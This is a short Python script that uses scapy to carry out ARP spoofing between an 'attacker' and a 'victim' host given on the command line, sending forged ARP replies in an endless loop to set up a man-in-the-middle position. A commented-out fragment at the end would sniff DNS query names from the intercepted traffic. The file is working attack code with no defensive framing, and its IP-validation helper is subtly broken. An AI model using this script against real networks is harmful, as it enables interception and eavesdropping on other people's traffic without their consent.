import os;
import re;
import argparse;
from threading import Thread;
from scapy.all import *;
def arg():
	arg=argparse.ArgumentParser();
	arg.add_argument("-a","--attacker",help="attacker ip address");
	arg.add_argument("-v","--victim",help="victim ip address");
	arg.add_argument("-i","--interface",help="interface");
	arg.add_argument("-ma","--macatt",help="mac address of the attacker");
	arg.add_argument("-mv","--macvic",help="mac address of the victim");
	fx=arg.parse_args();
	if(fx.attacker and fx.victim):
		natt=reg(fx.attacker);
		nvic=reg(fx.victim);
		iface="wlan0";
		if natt==None:
			print("attacker IP address is not valid!!".title());
			return;
		elif nvic==None:
			print("victim's IP address is not valid!!".title());
			return;
		else:
			if(fx.interface!=None):
				iface=fx.interface;
			if(fx.macatt!=None and fx.macvic!=None):
				while True:
					send(ARP(op=2,pdst=fx.attacker,hwdst=fx.macatt,psrc=fx.victim),iface=iface);
					send(ARP(op=2,pdst=fx.victim,hwdst=fx.macvic,psrc=fx.attacker),iface=iface);

def reg(rex):
	val=re.match("(?:(([0-9]?[0-9])|([01][0-9][0-9])|(2[0-4][0-9])|(25[0-5]))\.){3}((25[0-5])|(2[0-4][0-9])|([01][0-9][0-9])|([0-9]?[0-9]))",rex);
	if val!=0:
		return val;
	else:
		return 0;


if __name__=="__main__":
		arg();



#def fun(pkt):
#	for x in pkt:
#		if DNS in pkt:
#			return pkt[DNS].qd[DNSQR].qname;
#sniff(prn=fun);
